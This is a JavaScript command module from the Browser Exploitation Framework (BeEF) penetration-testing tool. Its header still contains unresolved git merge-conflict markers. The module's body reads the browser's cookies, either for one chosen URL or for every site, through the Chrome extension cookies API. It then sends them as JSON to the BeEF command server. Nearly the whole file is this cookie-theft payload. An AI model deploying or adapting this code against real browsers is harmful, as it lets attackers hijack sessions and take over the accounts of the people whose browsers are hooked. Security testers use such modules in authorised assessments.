//
<<<<<<< HEAD
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	the_url = "<%== @url %>";
	if (the_url != 'default_all') {
	    chrome.cookies.getAll({url:the_url}, function(cookies){
	        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
	    })
	} else {
		chrome.cookies.getAll({}, function(cookies){
        	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
    	})
	}

});

